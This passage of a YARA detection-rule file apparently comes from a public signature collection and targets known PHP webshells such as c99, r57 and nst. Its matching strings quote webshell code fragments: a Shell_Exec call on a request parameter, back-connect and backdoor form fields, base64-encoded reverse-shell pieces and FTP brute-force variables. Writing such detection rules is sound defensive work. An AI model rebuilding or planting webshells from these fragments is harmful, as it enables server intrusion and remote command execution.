		description = "Semi-Auto-generated  - file MySQL Web Interface Version 0.8.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "90616d2d-082b-5983-a859-62d1c5b8066e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4944-L4957"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "36d4f34d0a22080f47bb1cb94107c60f"
		logic_hash = "f0a20870a3240948e3ef1ad61685b00c5fc90d6098b87af9ac43ab44ccd13c9e"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "SooMin Kim"
		$s1 = "http://popeye.snu.ac.kr/~smkim/mysql"
		$s2 = "href='$PHP_SELF?action=dropField&dbname=$dbname&tablename=$tablename"
		$s3 = "<th>Type</th><th>&nbspM&nbsp</th><th>&nbspD&nbsp</th><th>unsigned</th><th>zerofi"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Simple_Cmd_Html
{
	meta:
		description = "Semi-Auto-generated  - file simple_cmd.html.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "30990574-02a0-5eed-8317-847b6be13300"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4958-L4971"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "c6381412df74dbf3bcd5a2b31522b544"
		logic_hash = "56b5b9e5518fa8a4be8c48735e997a538b0e534ad8fd72c1419dc0e8353bbc00"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "<title>G-Security Webshell</title>" fullword
		$s2 = "<input type=TEXT name=\"-cmd\" size=64 value=\"<?=$cmd?>\" " fullword
		$s3 = "<? if($cmd != \"\") print Shell_Exec($cmd);?>" fullword
		$s4 = "<? $cmd = $_REQUEST[\"-cmd\"];?>" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE__1_C2007_Php_Php_C100_Php
{
	meta:
		description = "Semi-Auto-generated  - from files 1.txt, c2007.php.php.txt, c100.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "00ada6a4-a32a-5184-867d-e10a8c95c41c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4972-L4986"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "6f6cb7c210bcd0f84c2ccff52850b1d673622ae49b83d614d63b5bbba7392327"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "44542e5c3e9790815c49d5f9beffbbf2"
		hash1 = "d089e7168373a0634e1ac18c0ee00085"
		hash2 = "38fd7e45f9c11a37463c3ded1c76af4c"

	strings:
		$s0 = "echo \"<b>Changing file-mode (\".$d.$f.\"), \".view_perms_color($d.$f).\" (\""
		$s3 = "echo \"<td>&nbsp;<a href=\\\"\".$sql_surl.\"sql_act=query&sql_query=\".ur"

	condition:
		1 of them
}

rule SIGNATURE_BASE__Nst_Php_Php_Img_Php_Php_Nstview_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - from files nst.php.php.txt, img.php.php.txt, nstview.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "238242f5-4e57-5edb-8806-ea5e06f1f637"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4987-L5002"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "b1e13f75edbbc8f9263e0e516a54330ce57190ba0b45813dad4bafeaeefa389b"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "ddaf9f1986d17284de83a17fe5f9fd94"
		hash1 = "17a07bb84e137b8aa60f87cd6bfab748"
		hash2 = "4745d510fed4378e4b1730f56f25e569"

	strings:
		$s0 = "<tr><form method=post><td><font color=red><b>Back connect:</b></font></td><td><i"
		$s1 = "$perl_proxy_scp = \"IyEvdXNyL2Jpbi9wZXJsICANCiMhL3Vzci91c2MvcGVybC81LjAwNC9iaW4v"
		$s2 = "<tr><form method=post><td><font color=red><b>Backdoor:</b></font></td><td><input"

	condition:
		1 of them
}

rule SIGNATURE_BASE__W_Php_Php_C99Madshell_V2_1_Php_Php_Wacking_Php_Php_Specialshell_99_Php_Php
{
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ee1fd555-f1bc-59a5-998c-f6098de8623e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L5018-L5033"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "a4bae5456baf0d8d894165c84d66118f2b16cfc040e299c2032eccb6a9eb4822"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "09609851caa129e40b0d56e90dfc476c"

	strings:
		$s2 = "echo \"<hr size=\\\"1\\\" noshade><b>Done!</b><br>Total time (secs.): \".$ft"
		$s3 = "$fqb_log .= \"\\r\\n------------------------------------------\\r\\nDone!\\r"

	condition:
		1 of them
}

rule SIGNATURE_BASE__C99Shell_V1_0_Php_Php_C99Php_Sses_Php_Php_Ctt_Sh_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - from files c99shell_v1.0.php.php.txt, c99php.txt, SsEs.php.php.txt, ctt_sh.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L5052-L5068"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "137f98b636ec012d7d5e687f7d24ae88e8d3261360e60a4bbc03da248cce381e"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash1 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash2 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
		hash3 = "671cad517edd254352fe7e0c7c981c39"

	strings:
		$s0 = "\"AAAAACH5BAEAAAkALAAAAAAUABQAAAR0MMlJqyzFalqEQJuGEQSCnWg6FogpkHAMF4HAJsWh7/ze\""
		$s2 = "\"mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm\""
		$s4 = "\"R0lGODlhFAAUAKL/AP/4/8DAwH9/AP/4AL+/vwAAAAAAAAAAACH5BAEAAAEALAAAAAAUABQAQAMo\""

	condition:
		2 of them
}

rule SIGNATURE_BASE__R577_Php_Php_Spy_Php_Php_S_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - from files r577.php.php.txt, spy.php.php.txt, s.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "d287136c-534b-51a4-88fc-40ef9f22d910"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L5069-L5083"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "09892789e8dad16f9fc7c4e22525e5d0af3af401a4b2655b70f7a6856888875c"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash2 = "817671e1bdc85e04cc3440bbd9288800"

	strings:
		$s2 = "echo $te.\"<div align=center><textarea cols=35 name=db_query>\".(!empty($_POST['"
		$s3 = "echo sr(45,\"<b>\".$lang[$language.'_text80'].$arrow.\"</b>\",\"<select name=db>"

	condition:
		1 of them
}

rule SIGNATURE_BASE__W_Php_Php_C99Madshell_V2_1_Php_Php_Wacking_Php_Php_C99Shell_V1_0_Php_Php_C99Php_Specialshell_99_Php_Php
{
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L5105-L5122"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "b133cf947476a1c94ed90b5cd3757ca8aa429be4284d75664625896d9cfa687f"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash4 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash5 = "09609851caa129e40b0d56e90dfc476c"

	strings:
		$s0 = "$sess_data[\"cut\"] = array(); c99_s"
		$s3 = "if ((!eregi(\"http://\",$uploadurl)) and (!eregi(\"https://\",$uploadurl))"

	condition:
		1 of them
}

rule SIGNATURE_BASE__W_Php_Php_Wacking_Php_Php_Specialshell_99_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - from files w.php.php.txt, wacking.php.php.txt, SpecialShell_99.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "c01ad0e5-1aff-5128-9d0c-5d0967532a4b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L5123-L5137"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "7bdaebfb093b58a2fd33b4bbeea8465d0f724383b4855eb521a3e339ee153781"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "9c5bb5e3a46ec28039e8986324e42792"
		hash2 = "09609851caa129e40b0d56e90dfc476c"

	strings:
		$s0 = "\"<td>&nbsp;<a href=\\\"\".$sql_surl.\"sql_act=query&sql_query=\".ur"
		$s2 = "c99sh_sqlquery"

	condition:
		1 of them
}

rule SIGNATURE_BASE__R577_Php_Php_Sniper_SA_Shell_Php_R57_Php_Php_Spy_Php_Php_S_Php_Php
{
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "44b53124-c8b6-545b-819f-77fd65e5d61b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L5155-L5171"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "834c33059e08e8075a8d3f69187b74f3b53afabfc37ae1f13a2f579f0948a363"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "911195a9b7c010f61b66439d9048f400"
		hash2 = "eddf7a8fde1e50a7f2a817ef7cece24f"
		hash3 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash4 = "817671e1bdc85e04cc3440bbd9288800"

	strings:
		$s0 = "echo sr(15,\"<b>\".$lang[$language.'_text"
		$s1 = ".$arrow.\"</b>\",in('text','"

	condition:
		2 of them
}

rule SIGNATURE_BASE__R577_Php_Php_Sniper_SA_Shell_Php_R57_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - from files r577.php.php.txt, SnIpEr_SA Shell.php.txt, r57.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "44b53124-c8b6-545b-819f-77fd65e5d61b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L5172-L5187"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "f97846fdaac949185b4ce6a25cc276f4ae4243d891acb18c3a3ce0c18b540976"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "911195a9b7c010f61b66439d9048f400"
		hash2 = "eddf7a8fde1e50a7f2a817ef7cece24f"

	strings:
		$s0 = "'ru_text9' =>'???????? ????? ? ???????? ??? ? /bin/bash'," fullword
		$s1 = "$name='ec371748dc2da624b35a4f8f685dd122'"
		$s2 = "rst.void.ru"

	condition:
		3 of them
}

rule SIGNATURE_BASE__Wacking_Php_Php_1_Specialshell_99_Php_Php_C100_Php
{
	meta:
		description = "Semi-Auto-generated  - from files wacking.php.php.txt, 1.txt, SpecialShell_99.php.php.txt, c100.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "3dac5550-598a-5a0f-95c3-2e0162a686ee"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L5205-L5221"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "0d32fc00ba2602a1140dc9030894bb9524c55b95c445a08f2bf6f8fc60108e64"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "9c5bb5e3a46ec28039e8986324e42792"
		hash1 = "44542e5c3e9790815c49d5f9beffbbf2"
		hash2 = "09609851caa129e40b0d56e90dfc476c"
		hash3 = "38fd7e45f9c11a37463c3ded1c76af4c"

	strings:
		$s0 = "if(eregi(\"./shbd $por\",$scan))"
		$s1 = "$_POST['backconnectip']"
		$s2 = "$_POST['backcconnmsg']"

	condition:
		1 of them
}

rule SIGNATURE_BASE__R577_Php_Php_R57_Php_Php_R57_Shell_Php_Php_Spy_Php_Php_S_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - from files r577.php.php.txt, r57.php.php.txt, r57 Shell.php.php.txt, spy.php.php.txt, s.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "093892f6-ff53-5bd1-b7b2-fea21a9258aa"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L5222-L5239"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "afbd2103b0c953d6aec070ba450f43e567560bc9743423a5731cd4d6e5e36bb6"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "eddf7a8fde1e50a7f2a817ef7cece24f"
		hash2 = "8023394542cddf8aee5dec6072ed02b5"
		hash3 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash4 = "817671e1bdc85e04cc3440bbd9288800"

	strings:
		$s1 = "if(rmdir($_POST['mk_name']))"
		$s2 = "$r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.$key.'</b></font></td>"
		$s3 = "if(unlink($_POST['mk_name'])) echo \"<table width=100% cellpadding=0 cell"

	condition:
		2 of them
}

rule SIGNATURE_BASE__W_Php_Php_Wacking_Php_Php_Sses_Php_Php_Specialshell_99_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - from files w.php.php.txt, wacking.php.php.txt, SsEs.php.php.txt, SpecialShell_99.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "81480945-b684-50b6-9431-4ab7a786b214"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L5240-L5256"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "9bbcb687c83c01ad52e8978a60e604a74f10c33a63af3b91d0286b30dea42890"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "9c5bb5e3a46ec28039e8986324e42792"
		hash2 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
		hash3 = "09609851caa129e40b0d56e90dfc476c"

	strings:
		$s0 = "\"ext_avi\"=>array(\"ext_avi\",\"ext_mov\",\"ext_mvi"
		$s1 = "echo \"<b>Execute file:</b><form action=\\\"\".$surl.\"\\\" method=POST><inpu"
		$s2 = "\"ext_htaccess\"=>array(\"ext_htaccess\",\"ext_htpasswd"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Multiple_Php_Webshells
{
	meta:
		description = "Semi-Auto-generated  - from files multiple_php_webshells"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L5258-L5279"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "d55c96febd64107273001edadbda6d0a1b4b00e35fb41b46561b49fca6a9bd1b"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "911195a9b7c010f61b66439d9048f400"
		hash2 = "be0f67f3e995517d18859ed57b4b4389"
		hash3 = "eddf7a8fde1e50a7f2a817ef7cece24f"
		hash4 = "8023394542cddf8aee5dec6072ed02b5"
		hash5 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash6 = "817671e1bdc85e04cc3440bbd9288800"
		hash7 = "7101fe72421402029e2629f3aaed6de7"
		hash8 = "f618f41f7ebeb5e5076986a66593afd1"

	strings:
		$s0 = "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuI"
		$s2 = "sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0"
		$s4 = "A8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg"

	condition:
		2 of them
}

rule SIGNATURE_BASE__W_Php_Php_C99Madshell_V2_1_Php_Php_Wacking_Php_Php_C99Shell_V1_0_Php_Php_C99Php
{
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L5296-L5313"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "e82882e89a1aeb256768f2af7a6d3674c89f9abc358710b33b8d3d425defcef1"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash4 = "9e9ae0332ada9c3797d6cee92c2ede62"

	strings:
		$s0 = "@ini_set(\"highlight" fullword
		$s1 = "echo \"<b>Result of execution this PHP-code</b>:<br>\";" fullword
		$s2 = "{$row[] = \"<b>Owner/Group</b>\";}" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE__GFS_Web_Shell_Ver_3_1_7___Priv8_Php_Nshell_Php_Php_Gfs_Sh_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - from files GFS web-shell ver 3.1.7 - PRiV8.php.txt, nshell.php.php.txt, gfs_sh.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "4d1dd87b-1ffd-564d-9411-c5d2fc01ae0f"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L5314-L5329"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "9df5b6df25574b303044a0799c5eb5f38f9ebfbc6f6114275fe1e34adbde1f7c"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "be0f67f3e995517d18859ed57b4b4389"
		hash1 = "4a44d82da21438e32d4f514ab35c26b6"
		hash2 = "f618f41f7ebeb5e5076986a66593afd1"

	strings:
		$s2 = "echo $uname.\"</font><br><b>\";" fullword
		$s3 = "while(!feof($f)) { $res.=fread($f,1024); }" fullword
		$s4 = "echo \"user=\".@get_current_user().\" uid=\".@getmyuid().\" gid=\".@getmygid()"

	condition:
		2 of them
}

rule SIGNATURE_BASE__W_Php_Php_C99Madshell_V2_1_Php_Php_Wacking_Php_Php_C99Shell_V1_0_Php_Php_Specialshell_99_Php_Php
{
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L5330-L5348"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "0f44dc1ff243b234a718e8dbd5cc8c4dc8eb9d3b63300a5c6ff72b86280607bf"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash4 = "09609851caa129e40b0d56e90dfc476c"

	strings:
		$s0 = "c99ftpbrutecheck"
		$s1 = "$ftpquick_t = round(getmicrotime()-$ftpquick_st,4);" fullword
		$s2 = "$fqb_lenght = $nixpwdperpage;" fullword
		$s3 = "$sock = @ftp_connect($host,$port,$timeout);" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE__C99Shell_V1_0_Php_Php_C99Php_Sses_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - from files c99shell_v1.0.php.php.txt, c99php.txt, SsEs.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L5383-L5396"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "b2bdf4187ff3d63e4af5c70e8cc93cd8fac3257b33c38764ad2bb2e206066162"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash1 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash2 = "6cd50a14ea0da0df6a246a60c8f6f9c9"

	strings:
		$s3 = "if (!empty($delerr)) {echo \"<b>Deleting with errors:</b><br>\".$delerr;}" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE__Nst_Php_Php_Cybershell_Php_Php_Img_Php_Php_Nstview_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - from files nst.php.php.txt, cybershell.php.php.txt, img.php.php.txt, nstview.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "cc4dc0e9-dbb1-560b-ae36-23d3e16a407f"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L5413-L5429"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "afc0b1c83644aa323d308471e5978b6b03f444f5f46fbaddac28ff42d524df1e"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "ddaf9f1986d17284de83a17fe5f9fd94"
		hash1 = "ef8828e0bc0641a655de3932199c0527"
		hash2 = "17a07bb84e137b8aa60f87cd6bfab748"
		hash3 = "4745d510fed4378e4b1730f56f25e569"

	strings:
		$s0 = "@$rto=$_POST['rto'];" fullword
		$s2 = "SCROLLBAR-TRACK-COLOR: #91AAFF" fullword
		$s3 = "$to1=str_replace(\"//\",\"/\",$to1);" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE__C99Shell_V1_0_Php_Php_C99Php_1_C2007_Php_Php_C100_Php
{
	meta:
		description = "Semi-Auto-generated  - from files c99shell_v1.0.php.php.txt, c99php.txt, 1.txt, c2007.php.php.txt, c100.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L5447-L5462"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "a5dc73a12d8c8b89bab77b90cb3b561e9daf9db5f5ad550326a2fbce52c1c8da"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash1 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash2 = "44542e5c3e9790815c49d5f9beffbbf2"
		hash3 = "d089e7168373a0634e1ac18c0ee00085"
		hash4 = "38fd7e45f9c11a37463c3ded1c76af4c"

	strings:
		$s0 = "$result = mysql_query(\"SHOW PROCESSLIST\", $sql_sock); " fullword

	condition:
		all of them
}

rule SIGNATURE_BASE__W_Php_Php_C99Madshell_V2_1_Php_Php_Wacking_Php_Php_1_Specialshell_99_Php_Php
{
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "4915146e-141c-5515-ac5a-61901d42dc40"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L5484-L5502"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "160adf93d4f9e51022c427b2b0601207dd9ca917e98d99e2013fe83e09a85d21"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
